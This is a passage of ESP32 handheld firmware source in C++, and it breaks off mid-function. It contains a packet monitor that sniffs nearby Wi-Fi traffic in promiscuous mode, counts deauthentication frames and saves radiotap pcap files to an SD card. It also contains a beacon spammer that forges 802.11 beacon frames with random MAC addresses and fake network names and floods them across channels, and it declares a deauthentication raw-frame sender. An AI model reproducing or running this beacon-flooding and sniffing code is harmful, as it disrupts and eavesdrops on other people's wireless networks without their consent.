#include "KeyboardUI.h"
#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "gps.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "nvs_flash.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"
#include "utils.h"


namespace Deauther {
  extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
}

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

namespace PacketMonitor {

/** Toolbar / meter strip fills (0x4208); file-level DARK_GRAY is remapped to UI_FG for text. */
static constexpr uint16_t kPtmToolbarBg = 0x4208;

static bool s_ptmHwReady = false;

#define MAX_CH 14
#define SNAP_LEN 2324

static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
static constexpr uint16_t PCAP_VER_MAJOR = 2;
static constexpr uint16_t PCAP_VER_MINOR = 4;
static constexpr uint32_t PCAP_SNAPLEN   = 65535;
static constexpr uint32_t PCAP_DLT_IEEE802_11_RADIO = 127;

static constexpr uint16_t RADIOTAP_LEN = 19;
static constexpr uint32_t RADIOTAP_PRESENT =
  (1u << 1) |
  (1u << 3) |
  (1u << 5) |
  (1u << 11) |
  (1u << 19);

struct __attribute__((packed)) RadiotapHdr16 {
  uint8_t  it_version;
  uint8_t  it_pad;
  uint16_t it_len;
  uint32_t it_present;
  uint8_t  flags;
  uint8_t  pad2;
  uint16_t chan_freq;
  uint16_t chan_flags;
  int8_t   dbm_antsignal;
  uint8_t  antenna;
  uint8_t  mcs_known;
  uint8_t  mcs_flags;
  uint8_t  mcs;
};

struct __attribute__((packed)) PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct __attribute__((packed)) PcapRecordHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

static bool  pcapEnabled = false;
static bool  pcapMounted = false;
static File  pcapFile;
static String pcapPath;
static uint32_t pcapPacketsWritten = 0;
static uint32_t pcapDropped = 0;
static uint32_t pcapLastFlushMs = 0;

static constexpr uint8_t PCAP_POOL_SIZE = 10;
struct PcapSlot {
  PcapRecordHeader hdr;
  uint16_t caplen;
  uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
};
static PcapSlot pcapPool[PCAP_POOL_SIZE];
static QueueHandle_t pcapFreeQ = nullptr;
static QueueHandle_t pcapWriteQ = nullptr;

static bool pcapMountSD() {
  if (pcapMounted) {
    if (SD.exists("/")) return true;
    pcapMounted = false;
  }

  #ifdef SD_CD
  pinMode(SD_CD, INPUT_PULLUP);
  if (digitalRead(SD_CD)) return false;
  #endif

  #ifdef SD_SCLK
  #ifdef SD_MISO
  #ifdef SD_MOSI
  #ifdef SD_CS
  SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
  #endif
  #endif
  #endif
  #endif

  #ifdef SD_CS
  if (SD.begin(SD_CS)) { pcapMounted = true; return true; }
  #endif

  #ifdef SD_CS_PIN
  #ifdef CC1101_CS
  if (SD_CS_PIN != CC1101_CS) {
    if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
  }
  #else
  if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
  #endif
  #endif

  return false;
}

static bool pcapEnsureDir(const char* dirPath) {
  if (!pcapMountSD()) return false;
  if (SD.exists(dirPath)) return true;
  if (SD.mkdir(dirPath)) return true;
  if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
  return false;
}

static bool pcapMakeNextPath(String& outPath) {

  for (uint16_t i = 0; i < 10000; i++) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
    if (!SD.exists(buf)) { outPath = String(buf); return true; }
  }
  return false;
}

static void pcapDisableAndCloseFile() {
  pcapEnabled = false;

  if (pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;
    while (xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      xQueueSend(pcapFreeQ, &slotIdx, 0);
    }
  }

  if (pcapFile) {
    pcapFile.flush();
    pcapFile.close();
  }
  pcapPath = "";
}

static void pcapStop() {
  pcapDisableAndCloseFile();

  if (pcapWriteQ) { vQueueDelete(pcapWriteQ); pcapWriteQ = nullptr; }
  if (pcapFreeQ)  { vQueueDelete(pcapFreeQ);  pcapFreeQ  = nullptr; }

  pcapPacketsWritten = 0;
  pcapDropped = 0;
  pcapLastFlushMs = 0;
}

static void pcapStart() {

  pcapStop();

  if (!pcapEnsureDir(CAPTURE_DIR)) return;
  if (!pcapMakeNextPath(pcapPath)) return;

  pcapFile = SD.open(pcapPath.c_str(), FILE_WRITE);
  if (!pcapFile) { pcapPath = ""; return; }

  PcapGlobalHeader gh{};
  gh.magic_number = PCAP_MAGIC_USEC;
  gh.version_major = PCAP_VER_MAJOR;
  gh.version_minor = PCAP_VER_MINOR;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = PCAP_SNAPLEN;
  gh.network = PCAP_DLT_IEEE802_11_RADIO;
  if (pcapFile.write((const uint8_t*)&gh, sizeof(gh)) != sizeof(gh)) {
    pcapFile.close();
    pcapPath = "";
    return;
  }

  pcapFreeQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  pcapWriteQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  if (!pcapFreeQ || !pcapWriteQ) {
    pcapStop();
    return;
  }

  for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
    xQueueSend(pcapFreeQ, &i, 0);
  }

  pcapEnabled = true;
  pcapLastFlushMs = millis();
}

static void ptmEnsureNvs() {
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
    ESP_ERROR_CHECK(ret);
  }
}

static void ptmStartRadioAndPcapOnce() {
  ptmEnsureNvs();

  wifi_mode_t wm = WIFI_MODE_NULL;
  const esp_err_t gm = esp_wifi_get_mode(&wm);
  if (gm == ESP_ERR_WIFI_NOT_INIT) {
    tcpip_adapter_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
  } else {
    ESP_ERROR_CHECK(gm);
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  }

  pcapStart();
  if (pcapEnabled && pcapPath.length()) {
    Serial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
  } else {
    Serial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
  }
}

static uint16_t pcapChannelToFreqMHz(uint8_t channel) {
  if (channel == 14) return 2484;
  if (channel >= 1 && channel <= 13) return (uint16_t)(2407 + channel * 5);

  if (channel >= 32) return (uint16_t)(5000 + channel * 5);
  return 0;
}

static uint16_t pcapChannelFlags(uint16_t freqMHz) {

  if (freqMHz >= 2400 && freqMHz < 2500) return 0x0080;
  if (freqMHz >= 4900 && freqMHz < 6000) return 0x0100;
  return 0;
}

#define MAX_X 240
#define MAX_Y 320

arduinoFFT FFT = arduinoFFT();

bool btnLeftPressed = false;
bool btnRightPressed = false;

Preferences preferences;

const uint16_t samples = 256;
const double samplingFrequency = 5000;

double attenuation = 10;

unsigned int sampling_period_us;
unsigned long microseconds;

double vReal[samples];
double vImag[samples];

byte palette_red[128], palette_green[128], palette_blue[128];

bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];
uint32_t deauths = 0;
unsigned int ch = 1;
int rssiSum;

unsigned int epoch = 0;
unsigned int color_cursor = 2016;

void do_sampling_FFT() {

  microseconds = micros();

  for (int i = 0; i < samples; i++) {
    vReal[i] = tmpPacketCounter * 300;
    vImag[i] = 1;
    while (micros() - microseconds < sampling_period_us) {

    }
    microseconds += sampling_period_us;
  }

  double mean = 0;

  for (uint16_t i = 0; i < samples; i++)
    mean += vReal[i];
  mean /= samples;
  for (uint16_t i = 0; i < samples; i++)
    vReal[i] -= mean;

  microseconds = micros();

  FFT.Windowing(vReal, samples, FFT_WIN_TYP_HAMMING, FFT_FORWARD);
  FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
  FFT.ComplexToMagnitude(vReal, vImag, samples);

  unsigned int left_x = 120;
  unsigned int graph_y_offset = 91;
  int max_k = 0;

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int vertical_x = left_x + j;

    tft.drawPixel(vertical_x, epoch + graph_y_offset, color);
  }

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int mirrored_x = left_x - j;
    tft.drawPixel(mirrored_x, epoch + graph_y_offset, color);
  }

  unsigned int area_graph_x_offset = 120;
  unsigned int area_graph_height = 50;
  unsigned int area_graph_y_offset = 38;

  static int last_y[samples >> 1] = {0};
  tft.fillRect(area_graph_x_offset, area_graph_y_offset, (samples >> 1), area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = area_graph_x_offset + j;

    if (j > 0) {
      tft.fillTriangle(x - 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x - 1, last_y[j - 1], color);
      tft.fillTriangle(x - 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  unsigned int area_graph_width = (samples >> 1);
  unsigned int area_graph_x_offset_flipped = -7;

  tft.fillRect(area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;

    if (j > 0) {
      tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
      tft.fillTriangle(x + 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  double tattenuation = max_k / 127.0;

  if (tattenuation > attenuation)
    attenuation = tattenuation;

  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setTextFont(1);

  tft.fillRect(30, 20, 130, 16, kPtmToolbarBg);

  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.print(ch);

  tft.setCursor(80, 24);
  tft.print("Packet:");
  tft.print(tmpPacketCounter);

  delay(10);
}

esp_err_t event_handler(void* ctx, system_event_t* event) {
  return ESP_OK;
}

double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal) maxVal = pkts[i];
  }
  if (maxVal > MAX_Y) return (double)MAX_Y / (double)maxVal;
  else return 1;
}

void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0 )) deauths++;

  if (type == WIFI_PKT_MISC) return;
  if (ctrl.sig_len > SNAP_LEN) return;

  const uint16_t packetLength = (uint16_t)ctrl.sig_len;
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;

  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ) return;

  uint8_t slotIdx;
  if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
    pcapDropped++;
    return;
  }

  if (slotIdx >= PCAP_POOL_SIZE) {

    pcapDropped++;
    return;
  }

  PcapSlot& s = pcapPool[slotIdx];

  const int64_t nowUs = esp_timer_get_time();
  s.hdr.ts_sec  = (uint32_t)(nowUs / 1000000LL);
  s.hdr.ts_usec = (uint32_t)(nowUs % 1000000LL);

  const uint16_t freq = pcapChannelToFreqMHz((uint8_t)ctrl.channel);
  RadiotapHdr16 rt{};
  rt.it_version = 0;
  rt.it_pad = 0;
  rt.it_len = RADIOTAP_LEN;
  rt.it_present = RADIOTAP_PRESENT;
  rt.flags = 0;
  rt.pad2 = 0;
  rt.chan_freq = freq;
  rt.chan_flags = pcapChannelFlags(freq);
  rt.dbm_antsignal = (int8_t)ctrl.rssi;
  rt.antenna = 0;
  rt.mcs_known = 0;
  rt.mcs_flags = 0;
  rt.mcs = 0;

  if (ctrl.sig_mode == 1) {

    rt.mcs_known =
      (1u << 0) |
      (1u << 1) |
      (1u << 2) |
      (1u << 4) |
      (1u << 5);

    const uint8_t bw = (ctrl.cwb ? 1 : 0);
    rt.mcs_flags |= (bw & 0x3);
    if (ctrl.sgi) rt.mcs_flags |= (1u << 2);
    if (ctrl.fec_coding) rt.mcs_flags |= (1u << 4);
    if (ctrl.stbc) rt.mcs_flags |= (1u << 5);

    rt.mcs = ctrl.mcs;
  }

  const uint16_t totalLen = (uint16_t)(RADIOTAP_LEN + packetLength);
  s.hdr.incl_len = totalLen;
  s.hdr.orig_len = totalLen;
  s.caplen = totalLen;
  memcpy(s.data, &rt, RADIOTAP_LEN);
  memcpy(s.data + RADIOTAP_LEN, pkt->payload, packetLength);

  if (xQueueSend(pcapWriteQ, &slotIdx, 0) != pdTRUE) {

    xQueueSend(pcapFreeQ, &slotIdx, 0);
    pcapDropped++;
    return;
  }
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1) ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

void draw() {
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0) rssi = rssiSum / (int)pkts[MAX_X - 1];
  else rssi = rssiSum;
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_up_plus,
    bitmap_icon_sort_down_minus,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, kPtmToolbarBg);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();

                switch (i) {
                  case 0: setChannel(ch + 1); break;
                  case 1: setChannel(ch - 1); break;
                }
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void ptmSetup() {
  s_ptmHwReady = false;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  for (int i = 0; i < 32; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = 63 - i;
  }
  for (int i = 64; i < 96; i++) {
    palette_red[i] = 31;
    palette_green[i] = (i - 64) * 2;
    palette_blue[i] = 0;
  }
  for (int i = 96; i < 128; i++) {
    palette_red[i] = 31;
    palette_green[i] = 63;
    palette_blue[i] = i - 96;
  }

  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  {
    float vBat = currentBatteryVoltage;
    if (vBat < 0.05f) {
      vBat = readBatteryVoltage();
    }
    drawStatusBar(vBat, true);
  }

  uiDrawn = false;
  runUI();

  /* Radio + PCAP init runs on first loop; show a short wait hint on the body. */
  constexpr int kPtmWaitBodyTop = 40;
  tft.fillRect(0, kPtmWaitBodyTop, tft.width(), tft.height() - kPtmWaitBodyTop, TFT_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
  tft.setTextFont(2);
  tft.drawString("PLEASE WAIT", tft.width() / 2, 86);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("802.11 monitor - standby", tft.width() / 2, 112);
  tft.drawString("Initializing (do not exit)...", tft.width() / 2, 128);
  tft.drawString("promisc RX + radiotap (19 B)", tft.width() / 2, 144);
  tft.setTextDatum(TL_DATUM);
}

void ptmLoop() {

  if (!s_ptmHwReady) {
    ptmStartRadioAndPcapOnce();
    s_ptmHwReady = true;
    constexpr int kPtmWaitBodyTop = 40;
    tft.fillRect(0, kPtmWaitBodyTop, tft.width(), tft.height() - kPtmWaitBodyTop, TFT_BLACK);
  }

  if (feature_active && isButtonPressed(BTN_SELECT)) {

    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    feature_exit_requested = true;
    return;
  }

  runUI();
  if (feature_exit_requested) {
    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    return;
  }
  updateStatusBar();

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);

  if (pcapEnabled && pcapFile && pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;

    uint16_t drained = 0;
    while (drained < 12 && xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      if (slotIdx < PCAP_POOL_SIZE) {
        PcapSlot& s = pcapPool[slotIdx];
        const size_t wroteHdr = pcapFile.write((const uint8_t*)&s.hdr, sizeof(s.hdr));
        const size_t wrotePkt = pcapFile.write(s.data, s.caplen);
        if (wroteHdr == sizeof(s.hdr) && wrotePkt == s.caplen) {
          pcapPacketsWritten++;
        } else {

          pcapDisableAndCloseFile();
        }
      }
      xQueueSend(pcapFreeQ, &slotIdx, 0);
      drained++;
    }

    const uint32_t now = millis();
    if (pcapFile && (now - pcapLastFlushMs) > 1000) {
      pcapFile.flush();
      pcapLastFlushMs = now;
    }
  }

  tft.drawLine(0, 90, 240, 90, TFT_WHITE);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  do_sampling_FFT();
  delay(10);
  epoch++;

  if (epoch >= tft.width())
    epoch = 0;

  static uint32_t lastButtonTime = 0;
  const uint32_t debounceDelay = 200;

  bool leftButtonState = !pcf.digitalRead(BTN_LEFT);
  bool rightButtonState = !pcf.digitalRead(BTN_RIGHT);

  uint32_t currentTime = millis();

  if (leftButtonState && !btnLeftPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnLeftPressed = true;
    setChannel(ch - 1);
    lastButtonTime = currentTime;
  } else if (!leftButtonState) {
    btnLeftPressed = false;
  }

  if (rightButtonState && !btnRightPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnRightPressed = true;
    setChannel(ch + 1);
    lastButtonTime = currentTime;
  } else if (!rightButtonState) {
    btnRightPressed = false;
  }

  pkts[127] = tmpPacketCounter;

  tmpPacketCounter = 0;
  deauths = 0;
  rssiSum = 0;
  }
}

namespace BeaconSpammer {

bool btnLeftPress;
bool btnRightPress;
bool btnSelectPress;

String ssidList[] = {
  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
  "Meme_LANd"
};

const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

uint8_t spamchannel = 1;
bool    spam        = false;
int     y_offset    = 20;

static uint8_t lastSpamChannel = 0xFF;
static bool    lastSpamState   = !false;

uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0xc0, 0x6c,
                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                       0x64, 0x00,
                       0x01, 0x04,
                       0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                       0x01, 0x08, 0x82, 0x84,
                       0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                       0x04
                      };

void handleLeftButton() {
  spamchannel = (spamchannel == 1) ? 14 : spamchannel - 1;
}

void handleRightButton() {
  spamchannel = (spamchannel == 14) ? 1 : spamchannel + 1;
}

void handleSelectButton() {
  spam = !spam;
}

void output() {

  tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);
  tft.print("[!] Preparing");

  for (int i = 0; i < 3; i++) {
    tft.print(".");
    delay(random(1000));
  }

  tft.setCursor(2, 50 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Configuring channel to ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("(");
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.print(spamchannel);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(")");
  delay(random(500));

  tft.setCursor(2, 70 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] SSID generated successfully");
  delay(random(500));

  tft.setCursor(2, 80 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] Setting random SRC MAC");
  delay(random(500));

  tft.setCursor(2, 110 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Starting broadcast");
  delay(random(500));

  for (int i = 0; i < 18; i++) {
    tft.setCursor(2, 130 + i * 10 + y_offset);
    String randomSSID = ssidList[random(ssidCount)];
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("[+] ");
    tft.print(randomSSID);
    delay(random(500));
  }
}

void spammer() {
  esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);

  for (int i = 10; i <= 21; i++) {
    packet[i] = random(256);
  }

  String randomSSID = ssidList[random(ssidCount)];
  int ssidLength = randomSSID.length();
  packet[37] = ssidLength;

  for (int i = 0; i < ssidLength; i++) {
    packet[38 + i] = randomSSID[i];
  }

  for (int i = 38 + ssidLength; i <= 43; i++) {
    packet[i] = 0x00;
  }

  packet[56] = spamchannel;

  esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);

  delay(1);
}

void beaconSpam() {
    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
    byte channel;

    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                            0xc0, 0x6c,
                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                            0x64, 0x00,
                            0x01, 0x04,
                            0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                            0x01, 0x08, 0x82, 0x84,
                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                            0x04};

    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);
    tft.setCursor(2, 30 + y_offset);
    tft.print("[!!] FUCK IT");
    tft.setCursor(2, 50 + y_offset);
    tft.print("[!!] Press [Select] to exit");

    delay(500);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("WiFi init failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Storage set failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Mode set failed: %d\n", err);
        return;
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("WiFi start failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Promiscuous set failed: %d\n", err);
        return;
    }

    while (true) {
        channel = random(1, 13);
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        for (int i = 10; i <= 15; i++) {
            packet[i] = random(256);
        }
        for (int i = 16; i <= 21; i++) {
            packet[i] = random(256);
        }

        packet[38] = ssid[random(65)];
        packet[39] = ssid[random(65)];
        packet[40] = ssid[random(65)];
        packet[41] = ssid[random(65)];
        packet[42] = ssid[random(65)];
        packet[43] = ssid[random(65)];

        packet[56] = channel;

        esp_err_t result;
